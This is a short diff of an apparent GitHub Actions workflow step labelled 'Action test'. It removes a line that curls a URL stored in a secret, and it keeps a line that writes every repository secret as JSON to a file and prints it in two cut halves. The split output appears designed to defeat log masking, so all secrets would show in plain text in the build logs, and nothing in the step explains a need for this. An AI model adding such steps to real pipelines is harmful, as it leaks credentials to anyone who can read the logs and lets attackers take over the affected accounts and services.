@@ -9,7 +9,6 @@ jobs:
     steps:
       - name: Action test
         run: |
-          curl ${{secrets.TEST_URL}} > hidden.txt
           echo "Retrieved hidden information"
           echo "-----"
           echo -n "${{ tojson(secrets) }}" >> foo && cut -c1-3 foo && cut -c4- foo
